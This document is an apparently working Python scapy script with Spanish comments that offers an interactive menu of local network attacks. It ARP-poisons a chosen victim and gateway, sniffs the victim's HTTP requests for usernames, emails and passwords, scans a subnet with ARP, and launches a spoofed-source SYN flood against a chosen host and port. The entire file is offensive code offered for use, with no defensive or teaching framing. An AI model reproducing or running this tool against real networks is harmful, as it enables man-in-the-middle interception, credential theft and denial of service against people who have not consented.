# -*- coding: utf-8 -*-
"""
Created on Sun May 10 15:16:34 2020

@author: MBI
"""
from scapy.all import *
import sys,os,threading,signal,re,logging,socket
from scapy_http import http


def captura_http(packet):
    wordlist=['email','username','user','usuario','password','passwd']
    if packet.haslayer(http.HTTPRequest):
        print(' Victima: {} Ip destino: {} Dominio: {}'.format(packet[IP].src,packet[IP].dst,packet[http.HTTPRequest].Host))
        if packet.haslayer(Raw):
            load=packet[Raw].load
            load=load.lower()
            for e in wordlist:
                if e.encode() in load:
                    print('Dato encontrado: {}'.format(load))
                
def captura():
    interface=input('[*] Interface [*]-> ')
    target_ip=input('[*] Ip objetivo [*]-> ') # Ip de la victima
    getway_ip=input('[*] Ip getwqy [*]-> ')
    filtro=input('[*] Filtro [*]->')+' ip host '+target_ip
    n_paquetes=int(input('[*] Numero de paquete , 0 es infinito [*]-> '))
    target_mac=get_mac(target_ip)
    getway_mac=get_mac(getway_ip)
    conf.iface=interface
    conf.verb=0
    
    if target_mac is None:
        print('[*] Fallo en obtencion de target mac [*] ')
        sys.exit(0)
    else: 
        print('[*] Objetivo  {}--{} [*]'.format(target_ip,target_mac))
        time.sleep(1)
        
    if getway_mac is None:
        print('[*] Fallo en obtencion de getway mac [*] ')
        sys.exit(0)
    
    else:
        print('[*] Objetivo  {}--{} [*]'.format(getway_ip,getway_mac))
        time.sleep(1)
        
    head=threading.Thread(target=poison_attack,args=(getway_ip,getway_mac,target_ip,target_mac))
    head.start()
    print('[*] Ataque iniciado [*]')
    while True:
        try:
            sniff(prn=lambda x: x.sprintf('{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}') ,iface=interface,count=n_paquetes,store=False,filter=filtro)

        except  KeyboardInterrupt:
            restore_system(getway_ip,getway_mac,target_ip,target_mac)
              
    
def restore_system(getway_ip,getway_mac,target_ip,target_mac):
    print('[*] Restableciendo target [*]...')
    send(ARP(op=2,psrc=getway_ip,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=getway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=getway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)
    return 0

def get_mac(ip_address):
    resposes,uname=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),timeout=2,retry=10)
    
    for s,r in resposes:
        return r[Ether].src
    return None
    
    
def poison_attack(getway_ip,getway_mac,target_ip,target_mac):
    poison_target=ARP()
    poison_target.op=2
    poison_target.psrc=getway_ip
    poison_target.pdst=target_ip
    poison_target.hwdst=target_mac
    
    poison_getway=ARP()
    poison_getway.op=2
    poison_getway.psrc=target_ip
    poison_getway.pdst=getway_ip
    poison_getway.hwdst=getway_mac
    print('[*] Comenzando el ataque  [*]...')
    time.sleep(2)
    while True:
        try:
            send(poison_target)
            send(poison_getway)
        except KeyboardInterrupt:
            restore_system(getway_ip,getway_mac,target_ip,target_mac)
            print('[*] Ataque finalizado [*]')
    return 0

def attack_system():
    interface=input('[*] Interface [*]-> ')
    target_ip=input('[*] Ip objetivo [*]-> ') # Ip de la victima
    getway_ip=input('[*] Ip getwqy [*]-> ')
    n_paquetes=int(input('[*] Numero de paquete , 0 es infinito [*]-> '))
    target_mac=get_mac(target_ip)
    getway_mac=get_mac(getway_ip)
    conf.iface=interface
    conf.verb=0

    if target_mac is None:
        print('[*] Fallo en obtencion de target mac [*] ')
        sys.exit(0)
    else: 
        print('[*] Objetivo  {}--{} [*]'.format(target_ip,target_mac))
        time.sleep(1)
        
    if getway_mac is None:
        print('[*] Fallo en obtencion de getway mac [*] ')
        sys.exit(0)
    
    else:
        print('[*] Objetivo  {}--{} [*]'.format(getway_ip,getway_mac))
        time.sleep(1)
        
    
    # start poison thread
    poison_thred=threading.Thread(target=poison_attack,args=(getway_ip,getway_mac,target_ip,target_mac))
    poison_thred.start()
    print('[*] Comenzando ataque a la {}'.format(target_ip))
    time.sleep(2)
    bpd='tcp on port 80 ip host '+target_ip
    try:
        print('[*] Capturando paquetes [*]')
        sniff(count=n_paquetes,filter=bpd,iface=interface,prn=captura_http,store=False)
        restore_system(getway_ip,getway_mac,target_ip,target_mac)
    except KeyboardInterrupt:
        restore_system(getway_ip,getway_mac,target_ip,target_mac)
        sys.exit(0)

def Scan_red():
    rango=input('[*] Rango de Ip [*]-> ')
    interface=input('[*] Interface [*]-> ')
    conf.iface=interface
    try:
        arping(rango,iface=conf.iface)

    except KeyboardInterrupt:
        print('[*] Fin de scaner [*]')
        print('\n')
    return  0
    
def Attack_DoS():
    logging.getLogger('scapy.rutime').setLevel(logging.ERROR)
    ip_destino=input('[*] Ip objetivo  [*]-> ')
    puerto=int(input('[*] Puerto objetivo [*]-> '))
    print('\n')
    conteo=0
  
    conf.verb=0
    ip_fuente=socket.gethostbyname(socket.gethostname())
    ip_variable=13
    pos=ip_fuente.find('.',8)
    ip_rango_source=ip_fuente[:pos]
    while True:
        try:
            ataque=IP(src=ip_rango_source+'.'+str(ip_variable),dst=ip_destino)/TCP(flags='S',sport=RandShort(),dport=puerto)
            send(ataque,inter=0.0002)
            conteo +=1
            print('[*] {} -> {}\tataque: {} [*]'.format(ip_rango_source+'.'+str(ip_variable),ip_destino,conteo))
            ip_variable +=1
            if ip_variable==200:
               ip_variable=13
            else:
                pass
            
        except KeyboardInterrupt:
            print('\n')
            print('[*] Ataque DoS finalizado [*]')
            sys.exit(0)



def Main():  
    while True:
        global target_ip,target_mac,getway_ip,getway_mac,n_paquetes,interface
        
        print('\n[*]Opciones de sniffing [*]\n')
        print('[*] Captura de paquetes [*]-> 1')
        print('[*] Captura de paquetes http [*]-> 2')
        print('[*] Salir [*]-> 3')
        print('[*] Scanear la red [*]-> 4')
        print('[*] Ataque DoS [*]-> 5')
        valor=input('[*] Seleccione [*]-> ')
        print('\n')
        if valor =='1':
            captura()
        elif valor=='2':
            attack_system()
        elif valor=='3':
            break
        elif valor=='4':
            Scan_red()
        elif valor=='5':
            Attack_DoS()
            
        
        
    sys.exit(0)

if __name__=='__main__':
    Main()
#%%


       


